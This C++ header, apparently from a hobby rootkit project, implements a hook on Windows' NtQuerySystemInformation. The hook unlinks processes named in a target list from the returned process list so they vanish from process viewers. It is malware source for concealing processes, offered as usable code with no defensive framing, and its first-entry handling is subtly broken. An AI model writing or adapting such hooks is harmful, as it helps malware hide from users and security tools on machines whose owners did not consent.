#ifndef HOOK_HPP
#define HOOK_HPP
// file: ./hook/hook.hpp
// autor: baa4ts

#include "def.hpp"

NTSTATUS NTAPI HookNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {

	/**
	* - - -  Pasos
	*  1 - Llamar a la funcion original
	*  2 - Recorrer solo si es informacion de proceso
	*  2 - y filtrar
	*/
	NTSTATUS status = originalNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);


	// Recorrer solo informacion de procesos
    if (SystemInformationClass == SystemProcessInformation && NT_SUCCESS(status)) {
        PSYSTEM_PROCESS_INFORMATION pActual = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
        PSYSTEM_PROCESS_INFORMATION pAnterior = nullptr;

        while (true) {
            std::wstring nombre;
            if (pActual->ImageName.Buffer)
                nombre.assign(pActual->ImageName.Buffer, pActual->ImageName.Length / sizeof(wchar_t));

            if (std::find(procesosObjetivos.begin(), procesosObjetivos.end(), nombre) != procesosObjetivos.end()) {
                if (pAnterior)
                    pAnterior->NextEntryOffset += pActual->NextEntryOffset;
                else
                    SystemInformation = (PVOID)((BYTE*)pActual + pActual->NextEntryOffset);
            }
            else {
                pAnterior = pActual;
            }

            if (pActual->NextEntryOffset == 0)
                break;

            pActual = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)pActual + pActual->NextEntryOffset);
        }
    }

	return status;
}

#endif // HOOK_HPP
